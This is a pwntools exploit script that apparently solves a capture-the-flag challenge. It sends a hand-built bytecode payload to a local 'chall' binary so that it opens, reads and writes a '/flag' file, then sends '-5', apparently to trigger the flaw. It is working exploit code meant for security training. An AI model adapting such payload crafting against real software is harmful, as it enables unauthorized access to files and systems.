#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 1337)

    return r


def main():
    r = conn()

    r.sendlineafter(b': ', b'1')
    
    # payload to open read write "/flag" named file in the cwd
    payload = b"\x91" * 20 + \
    b"\x28\xe1/" + \
    b"\x24\xe1\x30" + \
    b"\x28\xe1f" + \
    b"\x24\xe1\x31" + \
    b"\x28\xe1l" + \
    b"\x24\xe1\x32" + \
    b"\x28\xe1a" + \
    b"\x24\xe1\x33" + \
    b"\x28\xe1g" + \
    b"\x24\xe1\x34" + \
    b"\x28\xe1\x00" + \
    b"\x24\xe1\x35" + \
    b"\x28\xe1\x30" + \
    b"\xff\x23" + \
    b"\x28\xe2\x50" + \
    b"\x28\xe3\x40" + \
    b"\xff\x2d" + \
    b"\x28\xe1\x01" + \
    b"\xff\x2e"
    
    
    print(len(payload), payload)
    
    r.sendlineafter(b': ', payload)
    
    r.sendlineafter(b': ', b'-5')
    
    r.interactive()


if __name__ == "__main__":
    main()
